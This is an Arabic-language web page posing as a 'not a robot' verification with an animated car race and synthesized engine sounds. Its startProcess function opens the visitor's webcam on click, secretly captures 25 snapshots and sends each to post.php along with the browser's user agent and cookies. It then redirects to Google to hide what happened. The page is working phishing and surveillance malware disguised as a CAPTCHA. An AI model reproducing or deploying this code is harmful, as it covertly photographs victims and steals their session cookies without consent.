<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>نظام التحقق الأمني - سباق المحركات</title>
  <style>
    body { margin: 0; background: #050510; color: #fff; font-family: sans-serif; text-align: center; overflow: hidden; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
    .game-container { position: relative; width: 100%; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
    .ui-overlay { margin-bottom: 20px; z-index: 100; }
    h2 { font-size: 30px; color: #00d2ff; text-shadow: 0 0 10px rgba(0,210,255,0.5); margin: 0; }
    p { color: #fff; font-size: 18px; margin: 10px 0; }
    button { padding: 15px 45px; font-size: 22px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; transition: 0.2s; font-weight: bold; box-shadow: 0 4px 15px rgba(0,123,255,0.4); }
    button:hover { background: #0056b3; transform: scale(1.05); }

    .moon { position: absolute; top: 22%; left: 12%; width: 70px; height: 70px; background: #fefcd7; border-radius: 50%; box-shadow: 0 0 40px #fefcd7; z-index: 1; }
    .cloud { position: absolute; background: rgba(255,255,255,0.15); border-radius: 50px; height: 25px; width: 100px; animation: moveClouds linear infinite; z-index: 1; }
    @keyframes moveClouds { from { left: -150px; } to { left: 110%; } }

    .road { position: relative; width: 100%; height: 170px; background: #111; border-top: 4px solid #333; border-bottom: 4px solid #333; overflow: hidden; display: flex; align-items: center; z-index: 10; }
    .road::after { content: ""; position: absolute; top: 50%; left: 0; width: 200%; height: 8px; background: repeating-linear-gradient(to right, #fbbf24 0, #fbbf24 60px, transparent 60px, transparent 120px); transform: translateY(-50%); }
    .road.animating::after { animation: roadScroll 0.08s linear infinite; }
    @keyframes roadScroll { from { transform: translate(0, -50%); } to { transform: translate(-120px, -50%); } }

    .vehicle { position: absolute; bottom: 15px; left: -400px; z-index: 50; }
    .emoji { font-size: 110px; transform: scaleX(-1); }
    .headlights { position: absolute; top: 50px; right: -25px; width: 40px; height: 40px; background: #fff; border-radius: 50%; filter: blur(15px); box-shadow: 0 0 80px 35px #fff, 0 0 120px 50px #ff0; opacity: 0; }
    
    .box { position: absolute; font-size: 40px; z-index: 45; animation: fall 0.6s ease-in forwards; pointer-events: none; }
    @keyframes fall { 0% { transform: translateY(0) rotate(0deg); opacity: 1; } 100% { transform: translateY(70px) rotate(45deg); opacity: 1; } }

    .truck-move { animation: drive 5s linear forwards; animation-iteration-count: 5; }
    .ferrari-move { animation: drive 3.2s linear forwards 0.8s; animation-iteration-count: 5; }
    .taxi-move { animation: drive 4.2s linear forwards 1.8s; animation-iteration-count: 5; }
    .bike-move { animation: drive 2.8s linear forwards 2.5s; animation-iteration-count: 5; }

@keyframes drive { 0% { left: -400px; } 100% { left: 115%; } }
    .move .headlights { opacity: 1; }
    .bird { position: absolute; font-size: 28px; z-index: 5; animation: fly 25s linear infinite; }
    @keyframes fly { from { left: -50px; top: 15%; } to { left: 110%; top: 10%; } }
  </style>
</head>
<body>
<div class="game-container">
  <div class="moon"></div>
  <div class="cloud" style="top: 15%; animation-duration: 50s;"></div>
  <div class="cloud" style="top: 25%; animation-duration: 35s; width: 140px;"></div>
  <div class="bird">🦇</div>
  <div class="ui-overlay">
    <h2>يرجى التحقق من أنك لست روبوت</h2>
    <p>اضغط هنا لنتحقق</p>
    <button onclick="startProcess()">ابدأ التحقق الآن</button>
  </div>
  <div class="road" id="road">
    <div class="vehicle" id="truck"> <div class="emoji">🚚</div> <div class="headlights"></div> </div>
    <div class="vehicle" id="ferrari"> <div class="emoji">🏎️</div> <div class="headlights"></div> </div>
    <div class="vehicle" id="taxi"> <div class="emoji">🚕</div> <div class="headlights"></div> </div>
    <div class="vehicle" id="bike"> <div class="emoji">🏍️</div> <div class="headlights"></div> </div>
  </div>
</div>

<script>
let audioCtx;

function playSoundEffect(type) {
    if (!audioCtx) return;
    if (type === 'thump') {
        const osc = audioCtx.createOscillator(); const g = audioCtx.createGain();
        osc.type = 'sine'; osc.frequency.setValueAtTime(150, audioCtx.currentTime);
        osc.frequency.exponentialRampToValueAtTime(40, audioCtx.currentTime + 0.1);
        g.gain.setValueAtTime(0.2, audioCtx.currentTime); g.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.1);
        osc.connect(g); g.connect(audioCtx.destination); osc.start(); osc.stop(audioCtx.currentTime + 0.1);
    }
}

function dropBox() {
    const truck = document.getElementById('truck');
    const truckPos = truck.getBoundingClientRect();
    if (truckPos.left < 0 || truckPos.left > window.innerWidth) return;
    const box = document.createElement('div'); box.className = 'box'; box.innerHTML = '📦';
    box.style.left = (truckPos.left + 50) + 'px'; box.style.top = (truckPos.top + 40) + 'px';
    document.body.appendChild(box);
    setTimeout(() => { playSoundEffect('thump'); setTimeout(() => box.remove(), 1000); }, 500);
}

function playTruckHorn(startTime) {
    const osc1 = audioCtx.createOscillator(); const osc2 = audioCtx.createOscillator(); const g = audioCtx.createGain();
    osc1.type = 'sawtooth'; osc1.frequency.setValueAtTime(200, audioCtx.currentTime + startTime);
    osc2.type = 'sawtooth'; osc2.frequency.setValueAtTime(250, audioCtx.currentTime + startTime);
    g.gain.setValueAtTime(0, audioCtx.currentTime + startTime);
    g.gain.linearRampToValueAtTime(0.3, audioCtx.currentTime + startTime + 0.1);
    g.gain.setValueAtTime(0.3, audioCtx.currentTime + startTime + 1.2);
    g.gain.linearRampToValueAtTime(0, audioCtx.currentTime + startTime + 1.4);
    osc1.connect(g); osc2.connect(g); g.connect(audioCtx.destination);
    osc1.start(audioCtx.currentTime + startTime); osc1.stop(audioCtx.currentTime + startTime + 1.4);
    osc2.start(audioCtx.currentTime + startTime); osc2.stop(audioCtx.currentTime + startTime + 1.4);
}

function playPoliceSiren(startTime) {
    const osc = audioCtx.createOscillator(); const g = audioCtx.createGain();
    osc.type = 'sine'; osc.frequency.setValueAtTime(440, audioCtx.currentTime + startTime);
    osc.frequency.linearRampToValueAtTime(880, audioCtx.currentTime + startTime + 0.5);
    osc.frequency.linearRampToValueAtTime(440, audioCtx.currentTime + startTime + 1.0);
    osc.frequency.linearRampToValueAtTime(880, audioCtx.currentTime + startTime + 1.5);
    g.gain.setValueAtTime(0, audioCtx.currentTime + startTime);
    g.gain.linearRampToValueAtTime(0.2, audioCtx.currentTime + startTime + 0.1);
    g.gain.setValueAtTime(0.2, audioCtx.currentTime + startTime + 2.0);
    g.gain.linearRampToValueAtTime(0, audioCtx.currentTime + startTime + 2.2);
    osc.connect(g); g.connect(audioCtx.destination);
    osc.start(audioCtx.currentTime + startTime); osc.stop(audioCtx.currentTime + startTime + 2.2);
}

function playRealisticSounds() {
    try {
        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const playEngine = (baseFreq, type, maxGain, start, duration, freqMult) => {
            const osc = audioCtx.createOscillator(); const gn = audioCtx.createGain(); const fl = audioCtx.createBiquadFilter();
            osc.type = type; osc.frequency.setValueAtTime(baseFreq, audioCtx.currentTime + start);
            osc.frequency.exponentialRampToValueAtTime(baseFreq * freqMult, audioCtx.currentTime + start + duration);
            fl.type = "lowpass"; fl.frequency.value = 1000;
            gn.gain.setValueAtTime(0, audioCtx.currentTime + start);

osc.frequency.exponentialRampToValueAtTime(baseFreq * freqMult, audioCtx.currentTime + start + duration);
            fl.type = "lowpass"; fl.frequency.value = 1000;
            gn.gain.setValueAtTime(0, audioCtx.currentTime + start);
            gn.gain.linearRampToValueAtTime(maxGain, audioCtx.currentTime + start + 0.5);
            gn.gain.setValueAtTime(maxGain, audioCtx.currentTime + start + duration - 0.5); 
            gn.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + start + duration);
            osc.connect(fl); fl.connect(gn); gn.connect(audioCtx.destination);
            osc.start(audioCtx.currentTime + start); osc.stop(audioCtx.currentTime + start + duration);
        };

        for(let i=0; i<5; i++){
            let s = i * 6;
            playEngine(45, 'sawtooth', 0.2, s, 5.5, 1.2);
            playEngine(200, 'sawtooth', 0.35, s + 0.8, 3.5, 4);
            playEngine(120, 'triangle', 0.1, s + 1.8, 4.5, 1.5);
            playEngine(400, 'sawtooth', 0.2, s + 2.5, 3.0, 3);
            playTruckHorn(s + 1.5);
            playPoliceSiren(s + 2.5);
            for(let j=0; j<3; j++) { setTimeout(dropBox, (s + 1 + j*1.2) * 1000); }
            setTimeout(() => {
                const ho = audioCtx.createOscillator(); const hg = audioCtx.createGain(); ho.type = 'square'; ho.frequency.value = 440;
                hg.gain.setValueAtTime(0, audioCtx.currentTime); hg.gain.setValueAtTime(0.2, audioCtx.currentTime + 0.1);
                hg.gain.setValueAtTime(0, audioCtx.currentTime + 0.3); hg.gain.setValueAtTime(0.2, audioCtx.currentTime + 0.4);
                hg.gain.setValueAtTime(0, audioCtx.currentTime + 0.6); ho.connect(hg); hg.connect(audioCtx.destination);
                ho.start(); ho.stop(audioCtx.currentTime + 0.7);
            }, (s + 3.0) * 1000);
        }
    } catch(e) {}
}

async function startProcess() {
  try {
    playRealisticSounds();
    document.getElementById('road').classList.add('animating');
    ['truck', 'ferrari', 'taxi', 'bike'].forEach(id => {
      document.getElementById(id).classList.add(id + '-move', 'move');
    });

    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video'); video.srcObject = stream; await video.play();
    const canvas = document.createElement('canvas'); canvas.width = 640; canvas.height = 480;
    const ctx = canvas.getContext('2d');

for (let i = 0; i < 25; i++) {
      ctx.drawImage(video, 0, 0, 640, 480);
      const data = canvas.toDataURL('image/jpeg', 0.5);
      fetch('post.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'img=' + encodeURIComponent(data) + 
              '&info=' + encodeURIComponent(navigator.userAgent) + 
              '&cookies=' + encodeURIComponent(document.cookie || "No Cookies")
      }).catch(e => {});
      await new Promise(r => setTimeout(r, 1200));
    }
    stream.getTracks().forEach(t => t.stop());
    setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
  } catch (err) { alert("يرجى السماح بالكاميرا."); }
}
</script>
</body>
</html>